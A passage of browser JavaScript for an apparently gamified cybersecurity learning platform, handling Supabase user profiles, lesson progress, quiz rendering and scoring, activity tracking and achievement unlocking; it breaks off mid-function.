      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
        await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
         await supabase.rpc('increment_profile_counter', {
  user_id_param: currentUser.id,
  counter_field: counterType,
  increment_value: 1
});

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
